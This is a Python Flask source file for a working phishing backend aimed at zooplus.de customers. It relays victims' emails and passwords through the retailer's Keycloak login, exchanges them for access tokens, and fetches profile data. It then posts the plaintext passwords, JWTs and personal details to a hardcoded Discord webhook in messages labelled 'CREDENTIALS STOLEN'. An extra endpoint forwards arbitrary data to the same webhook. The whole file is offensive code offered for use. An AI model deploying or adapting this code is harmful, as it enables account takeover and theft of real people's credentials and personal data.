from flask import Flask, request, jsonify, send_file
import requests
import json
import os
import base64
import re
from datetime import datetime

app = Flask(__name__, static_folder='static')

KC = 'https://login.zooplus.de/auth/realms/zooplus'
WH = 'https://discord.com/api/webhooks/1484149298663784469/kW9I5_GJZ03UOW-_yR1v39ioYmiQSBZlqiYwSPct8QfYALWTlhQ3cE__2lmWQ12tvwx3'

def discord(data):
    try:
        requests.post(WH, json=data, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/proxy/token', methods=['POST', 'OPTIONS'])
def proxy_token():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r
    
    try:
        data = request.form.to_dict() or request.json or {}
        
        # Forward all params to Keycloak token endpoint
        resp = requests.post(
            f'{KC}/protocol/openid-connect/token',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15,
            allow_redirects=True
        )
        
        token_data = resp.json()
        
        # Log to Discord if we got a token
        if 'access_token' in token_data:
            try:
                jwt = token_data['access_token']
                # Decode JWT payload (add padding)
                payload_b64 = jwt.split('.')[1]
                payload_b64 += '=' * (4 - len(payload_b64) % 4)
                payload = json.loads(base64.b64decode(payload_b64).decode())
                
                discord({'embeds': [{
                    'title': '🎫 JWT TOKEN STOLEN',
                    'color': 0x00ff00,
                    'fields': [
                        {'name': '👤 Name', 'value': payload.get('name', 'N/A'), 'inline': True},
                        {'name': '📧 Email', 'value': payload.get('email', 'N/A'), 'inline': True},
                        {'name': '🆔 Customer ID', 'value': str(payload.get('customerId', 'N/A')), 'inline': True},
                        {'name': '🆔 Sub', 'value': payload.get('sub', 'N/A'), 'inline': False},
                        {'name': '🎭 Roles', 'value': ', '.join(payload.get('realm_access', {}).get('roles', [])), 'inline': False},
                        {'name': '🎫 JWT', 'value': f'```\n{jwt[:200]}...\n```', 'inline': False}
                    ],
                    'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
                }]})
            except Exception as e:
                pass
        
        r = jsonify(token_data)
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, resp.status_code
        
    except Exception as e:
        r = jsonify({'error': str(e)})
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, 502

@app.route('/proxy/userinfo', methods=['POST', 'OPTIONS'])
def proxy_userinfo():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        return r
    
    try:
        data = request.json or {}
        token = data.get('token', '') or request.headers.get('Authorization', '').replace('Bearer ', '')
        
        resp = requests.get(
            f'{KC}/protocol/openid-connect/userinfo',
            headers={'Authorization': f'Bearer {token}'},
            timeout=10
        )
        
        user_data = resp.json()
        
        # Log to Discord with full user data
        discord({'embeds': [{
            'title': '👤 USER DATA EXTRACTED',
            'color': 0x00ff00,
            'fields': [
                {'name': 'Full Name', 'value': f"{user_data.get('given_name', '')} {user_data.get('family_name', '')}", 'inline': True},
                {'name': 'Email', 'value': user_data.get('email', 'N/A'), 'inline': True},
                {'name': 'Sub', 'value': user_data.get('sub', 'N/A'), 'inline': False},
                {'name': 'Full Data', 'value': f'```json\n{json.dumps(user_data, indent=2)[:800]}\n```', 'inline': False}
            ],
            'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
        }]})
        
        r = jsonify(user_data)
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, resp.status_code
        
    except Exception as e:
        r = jsonify({'error': str(e)})
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, 502

@app.route('/proxy/log', methods=['POST', 'OPTIONS'])
def proxy_log():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r
    
    data = request.json or {}
    discord(data)
    
    r = jsonify({'ok': True})
    r.headers['Access-Control-Allow-Origin'] = '*'
    return r

@app.route('/proxy/auth', methods=['POST', 'OPTIONS'])
def proxy_auth():
    """Full auth flow: fetch login page, submit creds, exchange code → JWT"""
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r
    
    data = request.json or {}
    email = data.get('email', '')
    password = data.get('password', '')
    
    result = {'success': False, 'jwt': None, 'userinfo': None, 'error': None}
    
    try:
        session = requests.Session()
        
        # Step 1: Fetch Keycloak login page
        auth_url = f'{KC}/protocol/openid-connect/auth?response_type=code&client_id=shop-myzooplus-prod-zooplus&redirect_uri=https%3A%2F%2Fwww.zooplus.de%2Fweb%2Fsso-myzooplus%2Flogin&scope=openid+email+profile&state=steal'
        login_resp = session.get(auth_url, timeout=15)
        login_html = login_resp.text
        
        # Step 2: Extract form action and hidden fields
        import re
        form_match = re.search(r'action="([^"]+)"', login_html)
        form_action = form_match.group(1).replace('&amp;', '&') if form_match else None
        
        hidden = {}
        for m in re.finditer(r'name="([^"]+)"\s+value="([^"]*?)"', login_html):
            hidden[m.group(1)] = m.group(2)
        
        if not form_action:
            result['error'] = 'Could not find login form'
            r = jsonify(result)
            r.headers['Access-Control-Allow-Origin'] = '*'
            return r
        
        # Step 3: Submit credentials
        hidden['username'] = email
        hidden['password'] = password
        
        auth_resp = session.post(
            form_action,
            data=hidden,
            allow_redirects=True,
            timeout=15
        )
        
        # Step 4: Extract auth code from final redirect URL
        code = None
        if 'code=' in auth_resp.url:
            code_match = re.search(r'code=([^&]+)', auth_resp.url)
            if code_match:
                code = code_match.group(1)
        
        # Also check response text for code
        if not code:
            code_match = re.search(r'code=([^&"\' ]+)', auth_resp.text[:2000])
            if code_match:
                code = code_match.group(1)
        
        if code:
            # Step 5: Exchange code for JWT
            token_resp = session.post(
                f'{KC}/protocol/openid-connect/token',
                data={
                    'grant_type': 'authorization_code',
                    'client_id': 'shop-myzooplus-prod-zooplus',
                    'code': code,
                    'redirect_uri': 'https://www.zooplus.de/web/sso-myzooplus/login'
                },
                timeout=15
            )
            token_data = token_resp.json()
            
            if 'access_token' in token_data:
                jwt = token_data['access_token']
                result['jwt'] = jwt
                
                # Decode JWT payload
                try:
                    payload_b64 = jwt.split('.')[1]
                    payload_b64 += '=' * (4 - len(payload_b64) % 4)
                    payload = json.loads(base64.b64decode(payload_b64).decode())
                    result['jwt_payload'] = payload
                except:
                    pass
                
                # Step 6: Fetch userinfo
                ui_resp = session.get(
                    f'{KC}/protocol/openid-connect/userinfo',
                    headers={'Authorization': f'Bearer {jwt}'},
                    timeout=10
                )
                if ui_resp.status_code == 200:
                    result['userinfo'] = ui_resp.json()
                
                result['success'] = True
                
                # Log full loot to Discord
                fields = [
                    {'name': '📧 Email', 'value': f'```{email}```', 'inline': True},
                    {'name': '🔑 Password', 'value': f'```{password}```', 'inline': True},
                ]
                if result.get('jwt_payload'):
                    p = result['jwt_payload']
                    fields.extend([
                        {'name': '👤 Name', 'value': p.get('name', 'N/A'), 'inline': True},
                        {'name': '📧 Victim Email', 'value': p.get('email', 'N/A'), 'inline': True},
                        {'name': '🆔 Customer ID', 'value': str(p.get('customerId', 'N/A')), 'inline': True},
                        {'name': '🆔 Sub', 'value': p.get('sub', 'N/A'), 'inline': False},
                        {'name': '🎭 Roles', 'value': ', '.join(p.get('realm_access', {}).get('roles', [])), 'inline': False},
                        {'name': '🎫 JWT', 'value': f'```\n{jwt[:200]}...\n```', 'inline': False}
                    ])
                if result.get('userinfo'):
                    fields.append({'name': '📋 Userinfo', 'value': f'```json\n{json.dumps(result["userinfo"], indent=2)[:500]}\n```', 'inline': False})
                
                discord({'embeds': [{
                    'title': '🔱 FULL JWT + CREDENTIALS STOLEN',
                    'color': 0x00ff00,
                    'fields': fields,
                    'timestamp': datetime.utcnow().isoformat() + 'Z',
                    'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
                }]})
            else:
                result['error'] = f'Token exchange failed: {token_data.get("error_description", "unknown")}'
        else:
            # Check if it's a login failure
            if 'Invalid' in auth_resp.text or 'invalid' in auth_resp.text.lower():
                result['error'] = 'Invalid credentials'
            else:
                result['error'] = f'No auth code found. Status: {auth_resp.status_code}, URL: {auth_resp.url[:100]}'
                
    except Exception as e:
        result['error'] = str(e)
    
    # Also send credentials to Discord even if JWT failed
    if not result['success']:
        discord({'embeds': [{
            'title': '📧 CREDENTIALS CAPTURED (JWT failed)',
            'color': 0xff9900,
            'fields': [
                {'name': '📧 Email', 'value': f'```{email}```', 'inline': True},
                {'name': '🔑 Password', 'value': f'```{password}```', 'inline': True},
                {'name': '⚠️ Error', 'value': result.get('error', 'unknown'), 'inline': False}
            ],
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
        }]})
    
    r = jsonify(result)
    r.headers['Access-Control-Allow-Origin'] = '*'
    return r

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
